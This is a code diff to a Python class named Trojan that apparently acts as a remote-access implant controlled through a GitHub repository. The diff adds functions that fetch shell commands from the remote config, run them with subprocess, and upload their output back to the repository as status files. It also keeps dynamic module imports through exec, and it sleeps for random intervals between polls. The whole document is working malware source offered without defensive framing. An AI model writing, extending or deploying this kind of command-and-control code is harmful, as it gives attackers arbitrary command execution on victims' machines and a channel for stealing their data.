@@ -22,13 +22,14 @@ class Trojan:
     def __init__(self, id):
         self.id = id
         self.config_file = f'{id}.json'
-        self.data_path = f'data/{id}/'
+        self.data_path = f'data/{self.id}/'
         self.repo = github_connect()
+        self.running = True
 
     def get_config(self):
         config_json = get_file_contents('config', self.config_file, self.repo)
         config = json.loads(base64.b64decode(config_json))
-        for task in config:
+        for task in config.get('modules', []):
             if task['module'] not in sys.modules:
                 exec("import %s" % task['module'])
         return config
@@ -43,12 +44,31 @@ class Trojan:
         bindata = base64.b64encode(bytes('%r' % data, 'utf-8'))
         self.repo.create_file(remote_path, message, bindata)
 
+    def fetch_commands(self):
+        config = self.get_config()
+        commands = config.get('commands', [])
+        return commands
+
+    def execute_command(self, command):
+        if command.lower() == 'stop':
+            self.running = False
+            self.update_status('Stopped')
+        elif command.lower() == 'start':
+            self.running = True
+            self.update_status('Running')
+        else:
+            result = subprocess.getoutput(command)
+            self.update_status(f"Command '{command}' executed with result: {result}")
+
+    def update_status(self, status):
+        status_file_path = f'status/{self.id}.status'
+        self.repo.create_file(status_file_path, status, status.encode('utf-8'))
+
     def run(self):
-        while True:
-            config = self.get_config()
-            for task in config:
-                thread = threading.Thread(target=self.module_runner, args=(task['module'],))
-                thread.start()
+        while self.running:
+            commands = self.fetch_commands()
+            for command in commands:
+                self.execute_command(command)
                 time.sleep(random.randint(1, 10))
             time.sleep(random.randint(30*60, 3*60*60))
 
